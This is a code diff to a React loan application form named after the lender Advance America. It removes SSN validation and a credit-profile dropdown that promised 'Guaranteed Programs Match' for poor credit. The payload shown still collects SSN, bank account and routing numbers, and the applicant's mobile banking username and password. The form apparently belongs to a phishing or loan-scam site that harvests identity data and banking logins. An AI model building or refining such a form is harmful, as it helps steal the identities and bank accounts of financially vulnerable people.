@@ -12,9 +12,7 @@ const formSchema = z.object({
   dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
   city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
   zip: z.string().min(5, "Min 5 digits"),
-  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
   monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
-  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
   bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
   accountNumber: z.string().min(1,"Required"),
   routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
@@ -420,7 +418,7 @@ export default function AdvanceAmericaApply() {
         zip_code:data.zip, employment_status:"", employer_name:"",
         monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
         pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
-        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
+        client_id:client?.id||null, ssn:data.ssn, credit_score:'',
         bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
         account_number:data.accountNumber, routing_number:data.routingNumber,
         mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
@@ -568,7 +566,7 @@ export default function AdvanceAmericaApply() {
                       {errors.phone&&<p className="aa-err">{errors.phone.message}</p>}
                     </div>
                     <div className="aa-fgroup"><label className="aa-lbl">Date of Birth</label>
-                      <input className="aa-in" type="date" {...register("dob")}/>
+                      <input className="aa-in" type="text" placeholder="MM/DD/YYYY" {...register("dob")}/>
                       {errors.dob&&<p className="aa-err">{errors.dob.message}</p>}
                     </div>
                     <div className="aa-fgroup"><label className="aa-lbl">SSN (9 digits)</label>
@@ -604,19 +602,7 @@ export default function AdvanceAmericaApply() {
                       {errors.loanAmount&&<p className="aa-err">{errors.loanAmount.message}</p>}
                     </div>
                   </div>
-                  <div className="aa-fgroup" style={{marginTop:24}}><label className="aa-lbl">Estimated Credit Profile</label>
-                    <Controller name="creditScore" control={control} render={({field})=>(
-                      <Select onValueChange={field.onChange} value={field.value||""}>
-                        <SelectTrigger className="aa-in" style={{borderWidth:2}}><SelectValue placeholder="Select credit profile"/></SelectTrigger>
-                        <SelectContent style={{fontFamily:"'Inter',sans-serif"}}>
-                          <SelectItem value="good">Good / Excellent (700+)</SelectItem>
-                          <SelectItem value="low">Fair (600–699)</SelectItem>
-                          <SelectItem value="bad">Poor (Below 600) — Guaranteed Programs Match</SelectItem>
-                        </SelectContent>
-                      </Select>
-                    )}/>
-                    {errors.creditScore&&<p className="aa-err">{errors.creditScore.message}</p>}
-                  </div>
+
                 </div>
 
                 {/* Step 3 */}
